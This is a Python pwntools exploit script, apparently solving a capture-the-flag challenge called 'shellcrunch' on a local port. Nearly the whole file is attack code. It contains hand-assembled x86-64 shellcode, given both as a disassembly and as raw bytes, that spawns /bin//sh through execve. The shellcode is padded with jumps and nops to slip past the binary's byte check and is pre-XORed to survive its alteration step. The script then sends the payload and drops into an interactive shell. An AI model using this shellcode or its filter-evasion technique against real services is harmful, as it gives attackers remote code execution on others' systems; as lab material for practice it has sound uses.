from pwn import *

#p = ELF("./shellcrunch").process()
p = remote("localhost",3004)

#gdb.attach(p, "b *main+172");
p.clean()

# Shellcode that satisfies `check()` and works with the clobbering in `alter()`
shellcode = """
Disassembly:
0:  eb 04                   jmp    6 <_main+0x6>
2:  90                      nop
3:  cc                      int3
4:  90                      nop
5:  cc                      int3
6:  bb 3c 3e 61 78          mov    ebx,0x78613e3c
b:  90                      nop
c:  eb 04                   jmp    12 <_main+0x12>
e:  90                      nop
f:  cc                      int3
10: 90                      nop
11: cc                      int3
12: 48 c1 e3 10             shl    rbx,0x10
16: 90                      nop
17: 90                      nop
18: eb 04                   jmp    1e <_main+0x1e>
1a: 90                      nop
1b: cc                      int3
1c: 90                      nop
1d: cc                      int3
1e: 66 81 c3 7c 7a          add    bx,0x7a7c
23: 90                      nop
24: eb 04                   jmp    2a <_main+0x2a>
26: 90                      nop
27: cc                      int3
28: 90                      nop
29: cc                      int3
2a: 48 c1 e3 10             shl    rbx,0x10
2e: 90                      nop
2f: 90                      nop
30: eb 04                   jmp    36 <_main+0x36>
32: 90                      nop
33: cc                      int3
34: 90                      nop
35: cc                      int3
36: 66 81 c3 38 74          add    bx,0x7438
3b: 90                      nop
3c: eb 04                   jmp    42 <_main+0x42>
3e: 90                      nop
3f: cc                      int3
40: 90                      nop
41: cc                      int3
42: b9 13 11 12 10          mov    ecx,0x10121113
47: 90                      nop
48: eb 04                   jmp    4e <_main+0x4e>
4a: 90                      nop
4b: cc                      int3
4c: 90                      nop
4d: cc                      int3
4e: 48 c1 e1 10             shl    rcx,0x10
52: 90                      nop
53: 90                      nop
54: eb 04                   jmp    5a <_main+0x5a>
56: 90                      nop
57: cc                      int3
58: 90                      nop
59: cc                      int3
5a: 66 81 c1 15 14          add    cx,0x1415
5f: 90                      nop
60: eb 04                   jmp    66 <_main+0x66>
62: 90                      nop
63: cc                      int3
64: 90                      nop
65: cc                      int3
66: 48 c1 e1 10             shl    rcx,0x10
6a: 90                      nop
6b: 90                      nop
6c: eb 04                   jmp    72 <_main+0x72>
6e: 90                      nop
6f: cc                      int3
70: 90                      nop
71: cc                      int3
72: 66 81 c1 17 16          add    cx,0x1617
77: 90                      nop
78: eb 04                   jmp    7e <_main+0x7e>
7a: 90                      nop
7b: cc                      int3
7c: 90                      nop
7d: cc                      int3
7e: 48 31 cb                xor    rbx,rcx
81: 31 f6                   xor    esi,esi
83: 56                      push   rsi
84: eb 04                   jmp    8a <_main+0x8a>
86: 90                      nop
87: cc                      int3
88: 90                      nop
89: cc                      int3
8a: 53                      push   rbx
8b: 54                      push   rsp
8c: 5f                      pop    rdi
8d: 6a 3a                   push   0x3a
8f: 58                      pop    rax
90: eb 04                   jmp    96 <_main+0x96>
92: 90                      nop
93: cc                      int3
94: 90                      nop
95: cc                      int3
96: 48 ff c0                inc    rax
99: 31 d2                   xor    edx,edx
9b: 0f 05                   syscall
"""

shellcode = b"\xEB\x04\x90\xCC\x90\xCC\xBB\x3C\x3E\x61\x78\x90\xEB\x04\x90\xCC\x90\xCC\x48\xC1\xE3\x10\x90\x90\xEB\x04\x90\xCC\x90\xCC\x66\x81\xC3\x7C\x7A\x90\xEB\x04\x90\xCC\x90\xCC\x48\xC1\xE3\x10\x90\x90\xEB\x04\x90\xCC\x90\xCC\x66\x81\xC3\x38\x74\x90\xEB\x04\x90\xCC\x90\xCC\xB9\x13\x11\x12\x10\x90\xEB\x04\x90\xCC\x90\xCC\x48\xC1\xE1\x10\x90\x90\xEB\x04\x90\xCC\x90\xCC\x66\x81\xC1\x15\x14\x90\xEB\x04\x90\xCC\x90\xCC\x48\xC1\xE1\x10\x90\x90\xEB\x04\x90\xCC\x90\xCC\x66\x81\xC1\x17\x16\x90\xEB\x04\x90\xCC\x90\xCC\x48\x31\xCB\x31\xF6\x56\xEB\x04\x90\xCC\x90\xCC\x53\x54\x5F\x6A\x3A\x58\xEB\x04\x90\xCC\x90\xCC\x48\xFF\xC0\x31\xD2\x0F\x05"

# Modify shellcode to work with the XORing in `alter()`
shellcode = bytearray(shellcode)
for i in range(0, len(shellcode) - 1, 4):
    shellcode[i] ^= shellcode[i + 1]

shellcode = bytes(shellcode)

p.send(shellcode)

p.interactive()
